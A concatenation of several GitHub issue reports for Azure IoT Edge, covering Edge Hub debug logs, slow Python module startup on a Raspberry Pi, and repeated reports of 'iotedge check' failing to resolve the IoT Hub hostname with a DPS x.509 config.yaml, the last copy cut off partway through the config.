<7> 2019-09-11 15:26:31.039 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.ConnectivityAwareClient] - Operation SetMethodDefaultHandlerAsync succeeded for saschaTest/netfield-proxy
<7> 2019-09-11 15:26:31.039 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.InvokeMethodHandler] - Processing pending method invoke requests for client saschaTest/netfield-proxy.
<6> 2019-09-11 15:26:31.041 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Mqtt.SessionStateStoragePersistenceProvider] - Set subscriptions from session state for saschaTest/netfield-proxy
<6> 2019-09-11 15:26:31.363 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.SubscriptionProcessor] - Processing subscriptions TwinResponse, Methods for client saschaTest/netfield-proxy.
<7> 2019-09-11 15:26:31.364 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionManager] - Obtained cloud connection for device saschaTest/netfield-proxy
<6> 2019-09-11 15:26:31.365 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Mqtt.SessionStateStoragePersistenceProvider] - Set subscriptions from session state for saschaTest/netfield-proxy
<7> 2019-09-11 15:26:31.365 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.SubscriptionProcessor] - Processing subscription TwinResponse for client saschaTest/netfield-proxy.
<7> 2019-09-11 15:26:31.366 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.SubscriptionProcessor] - Processing subscription Methods for client saschaTest/netfield-proxy.
<7> 2019-09-11 15:26:31.367 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.DeviceConnectivityManager] - IotHub call succeeded
<7> 2019-09-11 15:26:31.367 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.ConnectivityAwareClient] - Operation SetMethodDefaultHandlerAsync succeeded for saschaTest/netfield-proxy
<7> 2019-09-11 15:26:31.368 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.InvokeMethodHandler] - Processing pending method invoke requests for client saschaTest/netfield-proxy.
<6> 2019-09-11 15:28:40.625 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionReauthenticator] - Reauthenticating connected clients
<7> 2019-09-11 15:28:40.626 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.IDeviceScopeIdentitiesCache] - Getting service identity for saschaTest/netfield-proxy
<7> 2019-09-11 15:28:40.627 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.DeviceScopeAuthenticator] - Client saschaTest/netfield-proxy in device scope reauthenticated locally.
<7> 2019-09-11 15:28:40.627 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Authenticator] - Client saschaTest/netfield-proxy re-authenticated successfully
<7> 2019-09-11 15:28:40.627 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionReauthenticator] - Reauthenticated client saschaTest/netfield-proxy successfully
<7> 2019-09-11 15:31:31.366 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.DeviceConnectivityManager] - Calling IotHub to test connectivity
<7> 2019-09-11 15:31:31.367 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionManager] - Obtained cloud connection for device saschaTest/$edgeHub
<7> 2019-09-11 15:31:31.494 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.DeviceConnectivityManager] - IotHub call succeeded
<7> 2019-09-11 15:31:31.495 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.ConnectivityAwareClient] - Operation UpdateReportedPropertiesAsync succeeded for saschaTest/$edgeHub
<7> 2019-09-11 15:31:31.495 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.CloudProxy] - Updating reported properties for device saschaTest/$edgeHub
<6> 2019-09-11 15:33:40.626 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionReauthenticator] - Reauthenticating connected clients
<7> 2019-09-11 15:33:40.627 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.IDeviceScopeIdentitiesCache] - Getting service identity for saschaTest/netfield-proxy
<7> 2019-09-11 15:33:40.628 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.DeviceScopeAuthenticator] - Client saschaTest/netfield-proxy in device scope reauthenticated locally.
<7> 2019-09-11 15:33:40.628 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Authenticator] - Client saschaTest/netfield-proxy re-authenticated successfully
<7> 2019-09-11 15:33:40.628 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionReauthenticator] - Reauthenticated client saschaTest/netfield-proxy successfully
<7> 2019-09-11 15:36:31.504 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.DeviceConnectivityManager] - Calling IotHub to test connectivity
<7> 2019-09-11 15:36:31.504 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionManager] - Obtained cloud connection for device saschaTest/$edgeHub
<7> 2019-09-11 15:36:31.630 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.DeviceConnectivityManager] - IotHub call succeeded
<7> 2019-09-11 15:36:31.630 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.ConnectivityAwareClient] - Operation UpdateReportedPropertiesAsync succeeded for saschaTest/$edgeHub
<7> 2019-09-11 15:36:31.631 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.CloudProxy] - Updating reported properties for device saschaTest/$edgeHub
<6> 2019-09-11 15:38:40.614 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionReauthenticator] - Reauthenticating connected clients
<7> 2019-09-11 15:38:40.614 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.IDeviceScopeIdentitiesCache] - Getting service identity for saschaTest/netfield-proxy
<7> 2019-09-11 15:38:40.615 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.DeviceScopeAuthenticator] - Client saschaTest/netfield-proxy in device scope reauthenticated locally.
<7> 2019-09-11 15:38:40.615 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Authenticator] - Client saschaTest/netfield-proxy re-authenticated successfully
<7> 2019-09-11 15:38:40.615 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionReauthenticator] - Reauthenticated client saschaTest/netfield-proxy successfully

```
</details>

## Additional Information
We used a c# container with Version 1.21.0. The issue is resolved when restarting edgeHub.
 As an interested user I followed you suggestion and placed a feature request on User Voice.

> * Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.

And I did this more than a month ago - https://feedback.azure.com/forums/907045-azure-iot-edge/suggestions/38782231-support-hierarchical-module-input-structure - but the issue still waits for an acknowledgement to be published.

So please make sure that the issues awaiting moderation on User Voice get processed; or otherwise remove the project form User Voice and provide other ways to collect feature requests (e.g. as github issues). Don't get me wrong; I'm much satisfied that I'm able to contribute ideas to the project - but at least there should be a response. Thanks in advance for your support!  ## Expected Behavior
IoTEdge modules in Python deployed through Docker should run at least in couple of minutes after deployed.

## Current Behavior
IoTEdge modules in Python after deployment using Microsoft Code to IoTHub, takes up to 30 minutes before the IoTEdge modules run. 

## Steps to Reproduce
1. 
2.
3.
4.

## Context (Environment)

### Device (Host) Operating System
Raspbian GNU/Linux 9 (stretch)

### Architecture
arm32v7

### Container Operating System
Docker containers, Docker version 3.0.2 build e042b58f

### Runtime Versions

#### iotedged
iotedge 1.0.4

#### Edge Agent
1.0

#### Edge Hub
1.0

#### Docker
3.0.2 build e042b58f

## Logs
I can share logs if needed.

## Additional Information
 <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
The `/etc/iotedge/config.yaml` is setup for DPS provisioning using x.509 certificates.

When running `sudo iotedge check --verbose --iothub-hostname https://iothub-name.azure-devices.net` (with my IoT Hub hostname) all checks should succeed without error.

## Current Behavior
The `iotedge check` command is returning the following errors for the **Connectivity Checks** showing that the IoT Hub Hostname cannot be resolved, even though running the `host IOT-HUB-HOSTNAME.azure-devices.net` command for the IoT Hub resolves correctly.

```
Connectivity checks
-------------------
√ host can connect to and perform TLS handshake with DPS endpoint - OK
× host can connect to and perform TLS handshake with IoT Hub AMQP port - Error
    Could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:5671 : could not resolve hostname
        caused by: failed to lookup address information: Name or service not known
× host can connect to and perform TLS handshake with IoT Hub HTTPS /WebSockets port - Error
    Could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:443 : could not resolve hostname
        caused by: failed to lookup address information: Name or service not known
× host can connect to and perform TLS handshake with IoT Hub MQTT port - Error
    Could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:8883 : could not resolve hostname
        caused by: failed to lookup address information: Name or service not known
× container on the default network can connect to IoT Hub AMQP port - Error
    Container on the default network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:5671
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the default network can connect to IoT Hub HTTPS / WebSockets port - Error
    Container on the default network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:443
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the default network can connect to IoT Hub MQTT port - Error
    Container on the default network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:8883
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the IoT Edge module network can connect to IoT Hub AMQP port - Error
    Container on the azure-iot-edge network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:5671
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the IoT Edge module network can connect to IoT Hub HTTPS / WebSockets port - Error
    Container on the azure-iot-edge network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:443
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the IoT Edge module network can connect to IoT Hub MQTT port - Error
    Container on the azure-iot-edge network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:8883
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× Edge Hub can bind to ports on host - Error
    Could not check current state of Edge Hub container
        caused by: docker returned exit code: 1, stderr = Error: No such object: edgeHub

10 check(s) succeeded.
3 check(s) raised warnings.
11 check(s) raised errors.
```

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1. Update the `/etc/iotedge/config.yaml to match the following that configures x.509 certificates for DPS provisioning of the IoT Edge Device:

```
###############################################################################
#                      IoT Edge Daemon configuration
###############################################################################
#
# This file configures the IoT Edge daemon. The daemon must be restarted to
# pick up any configuration changes.
#
# Note - this file is yaml. Learn more here: http://yaml.org/refcard.html
#
###############################################################################

###############################################################################
# Provisioning mode and settings
###############################################################################
#
# Configures the identity provisioning mode of the daemon.
#
# Supported modes:
#     manual - using an iothub connection string
#     dps    - using dps for provisioning
#
# DPS Settings
#     scope_id - Required. Value of a specific DPS instance's ID scope
#     registration_id - Required. Registration ID of a specific devicein DPS
#     symmetric_key - Optional. This entry should only be specified when
#                     provisioning devices configured for symmetric key
#                     attestation
###############################################################################

# Manual provisioning configuration
# provisioning:
#   source: "manual"
#   device_connection_string: "<ADD DEVICE CONNECTION STRING HERE>"

provisioning:
  source: "dps"
  global_endpoint: "https://global.azure-devices-provisioning.net"
  scope_id: "0ne000XXXXX”
  attestation:
    method: "x509"
    identity_cert: “/directory/certs/iot-edge-device-ca-MyEdgeDeviceCA-full-chain.cert.pem"
    identity_pk: “/directory/private/iot-edge-device-ca-MyEdgeDeviceCA.key.pem"
  dynamic_reprovisioning: false

###############################################################################
# Certificate settings
###############################################################################
#
# Configures the certificates required to operate the IoT Edge
# runtime as a gateway which enables external leaf devices to securely
# communicate with the Edge Hub. If not specified, the required certificates
# are auto generated for quick start scenarios which are not intended for
# production environments.
#
# Settings:
#     device_ca_cert   - path to the device ca certificate and its chain
#     device_ca_pk     - path to the device ca private key file
#     trusted_ca_certs - path to a file containing all the trusted CA
#                        certificates required for Edge module communication
#
###############################################################################

certificates:
  device_ca_cert: “/directory/certs/iot-edge-device-ca-MyEdgeDeviceCA-full-chain.cert.pem"
  device_ca_pk: “/directory/private/iot-edge-device-ca-MyEdgeDeviceCA.key.pem"
  trusted_ca_certs: “/directory/certs/azure-iot-test-only.root.ca.cert.pem"

###############################################################################
# Edge Agent module spec
###############################################################################
#
# Configures the initial Edge Agent module.
#
# The daemon uses this definition to bootstrap the system. The Edge Agent can
# then update itself based on the Edge Agent module definition presentin the
# deployment in IoT Hub.
#
# Settings:
#     name     - name of the edge agent module. Expected to be "edgeAgent".
#     type     - type of module. Always "docker".
#     env      - Any environment variable that needs to be set for edge agent module.
#     config   - type specific configuration for edge agent module.
#       image  - (docker) Modules require a docker image tag.
#       auth   - (docker) Modules may need authoriation to connect to container registry.
#
# Adding environment variables:
# replace "env: {}" with
#  env:
#    key: "value"
#
# Adding container registry authorization:
# replace "auth: {}" with
#    auth:
#      username: "username"
#      password: "password"
#      serveraddress: "serveraddress"
#
###############################################################################

agent:
  name: "edgeAgent"
  type: "docker"
  env: {}
  config:
    image: "mcr.microsoft.com/azureiotedge-agent:1.0"
    auth: {}

###############################################################################
# Edge device hostname
###############################################################################
#
# Configures the environment variable 'IOTEDGE_GATEWAYHOSTNAME' injected into
# modules. Regardless of case the hostname is specified below, a lowercase
# value is used to configure the Edge Hub server hostname as well as the
# environment variable specified above.
#
# It is important to note that when connecting downstream devices to the
# Edge Hub that the lower case value of this hostname be used in the
# 'GatewayHostName' field of the device's connection string URI.
###############################################################################

hostname: "AzureIoTEdgeGatewayLinuxVM"

###############################################################################
# Watchdog settings
###############################################################################
#
# The IoT edge daemon has a watchdog that periodically checks the health of the
# Edge Agent module and restarts it if it's down.
#
# max_retries - Configures the number of retry attempts that the IoT edge daemon
#               should make for failed operations before failing with a fatal error.
#
#               If this configuration is not specified, the daemon keeps retrying
#               on errors and doesn't fail fatally.
#
#               On a fatal failure, the daemon returns an exit code which
#               signifies the kind of error encountered. Currently, the following
#               error codes are returned by the daemon -
#
#               150 - Invalid Device ID specified.
#               151 - Invalid IoT hub configuration.
#               152 - Invalid SAS token used to call IoT hub.
#                     This could signal an invalid SAS key.
#               1 - All other errors.
###############################################################################

#watchdog:
#  max_retries: 2

###############################################################################
# Connect settings
###############################################################################
#
#
#Configures URIs used by clients of the management and workload APIs
#     management_uri - used by the Edge Agent and 'iotedge' CLI to start,
#                      stop, and manage modules
#     workload_uri   - used by modules to retrieve tokens and certificates
#
# The following uri schemes are supported:
#     http - connect over TCP
#     unix - connect over Unix domain socket
#
###############################################################################

connect:
  management_uri: "unix:///var/run/iotedge/mgmt.sock"
  workload_uri: "unix:///var/run/iotedge/workload.sock"

###############################################################################
# Listen settings
###############################################################################
#
# Configures the listen addresses for the daemon.
#     management_uri - used by the Edge Agent and 'iotedge' CLI to start,
#                      stop, and manage modules
#     workload_uri   - used by modules to retrieve tokens and certificates
#
# The following uri schemes are supported:
#     http - listen over TCP
#     unix - listen over Unix domain socket
#     fd   - listen using systemd socket activation
#
# These values can be different from the connect URIs. For instance, when
# using the fd:// scheme for systemd:
#     listen address is fd://iotedge.workload,
#     connect address is unix:///var/run/iotedge/workload.sock
#
###############################################################################

listen:
  management_uri: "fd://iotedge.mgmt.socket"
  workload_uri: "fd://iotedge.socket"

###############################################################################
# Home Directory
###############################################################################
#
# Configures the home directory for the daemon.
#
###############################################################################

homedir: "/var/lib/iotedge"

###############################################################################
# Moby Container Runtime settings
###############################################################################
#
# uri - configures the uri for the container runtime.
# network - configures the network on which the containers will be created.
#
###############################################################################

moby_runtime:
  uri: "unix:///var/run/docker.sock"
#   network: "azure-iot-edge"
```

2. Run the following command:

```sh
sudo iotedge check --verbose --iothub-hostname https://iothub-name.azure-devices.net
```


## Context (Environment)

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```

Configuration checks
--------------------
√ config.yaml is well-formed - OK
× config.yaml has well-formed connection string - Error
    Device is not using manual provisioning, so Azure IoT Hub hostname needs to be specified with --iothub-hostname
√ container engine is installed and functional - OK
‼ config.yaml has correct hostname - Warning
    config.yaml has hostname AzureIoTEdgeGatewayLinuxVM which does not comply with RFC 1035.

    - Hostname must be between 1 and 255 octets inclusive.
    - Each label in the hostname (component separated by ".") must be between 1 and 63 octets inclusive.
    - Each label must start with an ASCII alphabet character (a-z), end with an ASCII alphanumeric character (a-z, 0-9), and must contain only ASCII alphanumeric characters or hyphens (a-z, 0-9, "-").

    Not complying with RFC 1035 may cause errors during the TLShandshake with modules and downstream devices.
× config.yaml has correct URIs for daemon mgmt endpoint - Error
    Error: could not execute list-modules request: an error occurred trying to connect: Connection refused (os error 111)
        caused by: docker returned exit code: 1, stderr = Error: could not execute list-modules request: an error occurred trying to connect: Connection refused (os error 111)
√ latest security daemon - OK
√ host time is close to real time - OK
√ container time is close to host time - OK
‼ DNS server - Warning
    Container engine is not configured with DNS server setting,which may impact connectivity to IoT Hub.
    Please see https://aka.ms/iotedge-prod-checklist-dns for best practices.
    You can ignore this warning if you are setting DNS server per module in the Edge deployment.
        caused by: Could not open container engine config file /etc/docker/daemon.json
        caused by: No such file or directory (os error 2)
√ production readiness: certificates - OK
√ production readiness: certificates expiry - OK
√ production readiness: container engine - OK
‼ production readiness: logs policy - Warning
    Container engine is not configured to rotate module logs which may cause it run out of disk space.
    Please see https://aka.ms/iotedge-prod-checklist-logs for best practices.
    You can ignore this warning if you are setting log policy per module in the Edge deployment.
        caused by: Could not open container engine config file /etc/docker/daemon.json
        caused by: No such file or directory (os error 2)

Connectivity checks
-------------------
√ host can connect to and perform TLS handshake with DPS endpoint - OK
‼ host can connect to and perform TLS handshake with IoT Hub AMQP port - Warning
    skipping because of previous failures
‼ host can connect to and perform TLS handshake with IoT Hub HTTPS / WebSockets port - Warning
    skipping because of previous failures
‼ host can connect to and perform TLS handshake with IoT Hub MQTT port - Warning
    skipping because of previous failures
‼ container on the default network can connect to IoT Hub AMQP port - Warning
    skipping because of previous failures
‼ container on the default network can connect to IoT Hub HTTPS/ WebSockets port - Warning
    skipping because of previous failures
‼ container on the default network can connect to IoT Hub MQTT port - Warning
    skipping because of previous failures
‼ container on the IoT Edge module network can connect to IoT Hub AMQP port - Warning
    skipping because of previous failures
‼ container on the IoT Edge module network can connect to IoT Hub HTTPS / WebSockets port - Warning
    skipping because of previous failures
‼ container on the IoT Edge module network can connect to IoT Hub MQTT port - Warning
    skipping because of previous failures
× Edge Hub can bind to ports on host - Error
    Could not check current state of Edge Hub container
        caused by: docker returned exit code: 1, stderr = Error: No such object: edgeHub

9 check(s) succeeded.
3 check(s) raised warnings.
3 check(s) raised errors.
9 check(s) were skipped due to errors from other checks.

```
</details>

### Device Information

The host OS I'm using for this IoT Edge Device is the **Azure IoT Edge on Ubuntu** VM image from the Azure Marketplace.

* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: **Ubuntu 16.04**
* Container OS [e.g. Linux containers, Windows containers]: **Linux**

### Runtime Versions
* iotedged [run `iotedge version`]: **iotedge 1.0.8 (`208b2204fd30e856d00b280112422130c104b9f0`)**
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: **3.0.8**

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->

<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

<Paste here between the triple backticks>

```
</details>

## Additional Information
N/A
 <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
The `/etc/iotedge/config.yaml` is setup for DPS provisioning using x.509 certificates.

When running `sudo iotedge check --verbose --iothub-hostname https://iothub-name.azure-devices.net` (with my IoT Hub hostname) all checks should succeed without error.

## Current Behavior
The `iotedge check` command is returning the following errors for the **Connectivity Checks** showing that the IoT Hub Hostname cannot be resolved, even though running the `host IOT-HUB-HOSTNAME.azure-devices.net` command for the IoT Hub resolves correctly.

```
Connectivity checks
-------------------
√ host can connect to and perform TLS handshake with DPS endpoint - OK
× host can connect to and perform TLS handshake with IoT Hub AMQP port - Error
    Could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:5671 : could not resolve hostname
        caused by: failed to lookup address information: Name or service not known
× host can connect to and perform TLS handshake with IoT Hub HTTPS /WebSockets port - Error
    Could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:443 : could not resolve hostname
        caused by: failed to lookup address information: Name or service not known
× host can connect to and perform TLS handshake with IoT Hub MQTT port - Error
    Could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:8883 : could not resolve hostname
        caused by: failed to lookup address information: Name or service not known
× container on the default network can connect to IoT Hub AMQP port - Error
    Container on the default network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:5671
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the default network can connect to IoT Hub HTTPS / WebSockets port - Error
    Container on the default network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:443
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the default network can connect to IoT Hub MQTT port - Error
    Container on the default network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:8883
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the IoT Edge module network can connect to IoT Hub AMQP port - Error
    Container on the azure-iot-edge network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:5671
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the IoT Edge module network can connect to IoT Hub HTTPS / WebSockets port - Error
    Container on the azure-iot-edge network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:443
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× container on the IoT Edge module network can connect to IoT Hub MQTT port - Error
    Container on the azure-iot-edge network could not connect to https://IOT-HUB-HOSTNAME.azure-devices.net:8883
        caused by: docker returned exit code: 1, stderr = Error: could not resolve Azure IoT Hub hostname: failed to lookup address information: Name does not resolve
× Edge Hub can bind to ports on host - Error
    Could not check current state of Edge Hub container
        caused by: docker returned exit code: 1, stderr = Error: No such object: edgeHub

10 check(s) succeeded.
3 check(s) raised warnings.
11 check(s) raised errors.
```

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1. Update the `/etc/iotedge/config.yaml to match the following that configures x.509 certificates for DPS provisioning of the IoT Edge Device:

```
###############################################################################
#                      IoT Edge Daemon configuration
###############################################################################
#
# This file configures the IoT Edge daemon. The daemon must be restarted to
# pick up any configuration changes.
#
# Note - this file is yaml. Learn more here: http://yaml.org/refcard.html
#
###############################################################################

###############################################################################
# Provisioning mode and settings
###############################################################################
#
# Configures the identity provisioning mode of the daemon.
#
# Supported modes:
#     manual - using an iothub connection string
#     dps    - using dps for provisioning
#
# DPS Settings
#     scope_id - Required. Value of a specific DPS instance's ID scope
#     registration_id - Required. Registration ID of a specific devicein DPS
#     symmetric_key - Optional. This entry should only be specified when
#                     provisioning devices configured for symmetric key
#                     attestation
###############################################################################

# Manual provisioning configuration
# provisioning:
#   source: "manual"
#   device_connection_string: "<ADD DEVICE CONNECTION STRING HERE>"

provisioning:
  source: "dps"
  global_endpoint: "https://global.azure-devices-provisioning.net"
  scope_id: "0ne000XXXXX”
  attestation:
    method: "x509"
    iothub_hostname: "https://IOTHUB-HOSTNAME.azure-devices.net"
    identity_cert: “/directory/certs/iot-edge-device-ca-MyEdgeDeviceCA-full-chain.cert.pem"
    identity_pk: “/directory/private/iot-edge-device-ca-MyEdgeDeviceCA.key.pem"
  dynamic_reprovisioning: false

###############################################################################
# Certificate settings
###############################################################################
#
# Configures the certificates required to operate the IoT Edge
# runtime as a gateway which enables external leaf devices to securely
# communicate with the Edge Hub. If not specified, the required certificates
# are auto generated for quick start scenarios which are not intended for
# production environments.
#
# Settings:
#     device_ca_cert   - path to the device ca certificate and its chain
#     device_ca_pk     - path to the device ca private key file
#     trusted_ca_certs - path to a file containing all the trusted CA
#                        certificates required for Edge module communication
#
###############################################################################

certificates:
  device_ca_cert: “/directory/certs/iot-edge-device-ca-MyEdgeDeviceCA-full-chain.cert.pem"
  device_ca_pk: “/directory/private/iot-edge-device-ca-MyEdgeDeviceCA.key.pem"
  trusted_ca_certs: “/directory/certs/azure-iot-test-only.root.ca.cert.pem"

###############################################################################
# Edge Agent module spec
###############################################################################
#
# Configures the initial Edge Agent module.
#
# The daemon uses this definition to bootstrap the system. The Edge Agent can
# then update itself based on the Edge Agent module definition presentin the
# deployment in IoT Hub.
#
# Settings:
#     name     - name of the edge agent module. Expected to be "edgeAgent".
#     type     - type of module. Always "docker".
#     env      - Any environment variable that needs to be set for edge agent module.
#     config   - type specific configuration for edge agent module.
#       image  - (docker) Modules require a docker image tag.
#       auth   - (docker) Modules may need authoriation to connect to container registry.
#
# Adding environment variables:
# replace "env: {}" with
#  env:
#    key: "value"
#
# Adding container registry authorization:
# replace "auth: {}" with
#    auth:
#      username: "username"
#      password: "password"
#      serveraddress: "serveraddress"
#
###############################################################################

agent:
  name: "edgeAgent"
  type: "docker"
  env: {}
  config:
    image: "mcr.microsoft.com/azureiotedge-agent:1.0"
    auth: {}

###############################################################################
# Edge device hostname
###############################################################################
#
# Configures the environment variable 'IOTEDGE_GATEWAYHOSTNAME' injected into
# modules. Regardless of case the hostname is specified below, a lowercase
# value is used to configure the Edge Hub server hostname as well as the
# environment variable specified above.
#
# It is important to note that when connecting downstream devices to the
# Edge Hub that the lower case value of this hostname be used in the
# 'GatewayHostName' field of the device's connection string URI.
###############################################################################

hostname: "AzureIoTEdgeGatewayLinuxVM"

###############################################################################
# Watchdog settings
###############################################################################
#
# The IoT edge daemon has a watchdog that periodically checks the health of the
# Edge Agent module and restarts it if it's down.
#
# max_retries - Configures the number of retry attempts that the IoT edge daemon
#               should make for failed operations before failing with a fatal error.
#
#               If this configuration is not specified, the daemon keeps retrying
#               on errors and doesn't fail fatally.
#
#               On a fatal failure, the daemon returns an exit code which
#               signifies the kind of error encountered. Currently, the following
#               error codes are returned by the daemon -
#
#               150 - Invalid Device ID specified.
#               151 - Invalid IoT hub configuration.
#               152 - Invalid SAS token used to call IoT hub.
#                     This could signal an invalid SAS key.
#               1 - All other errors.
###############################################################################

#watchdog:
#  max_retries: 2

###############################################################################
# Connect settings
###############################################################################
#
#
#Configures URIs used by clients of the management and workload APIs
#     management_uri - used by the Edge Agent and 'iotedge' CLI to start,
#                      stop, and manage modules
#     workload_uri   - used by modules to retrieve tokens and certificates
#
# The following uri schemes are supported:
#     http - connect over TCP
#     unix - connect over Unix domain socket
#
###############################################################################

connect:
  management_uri: "unix:///var/run/iotedge/mgmt.sock"
  workload_uri: "unix:///var/run/iotedge/workload.sock"

###############################################################################
# Listen settings
###############################################################################
#
# Configures the listen addresses for the daemon.
#     management_uri - used by the Edge Agent and 'iotedge' CLI to start,
#                      stop, and manage modules
#     workload_uri   - used by modules to retrieve tokens and certificates
#
# The following uri schemes are supported:
#     http - listen over TCP
#     unix - listen over Unix domain socket
#     fd   - listen using systemd socket activation
#
# These values can be different from the connect URIs. For instance, when
# using the fd:// scheme for systemd:
#     listen address is fd://iotedge.workload,
#     connect address is unix:///var/run/iotedge/workload.sock
#
###############################################################################

listen:
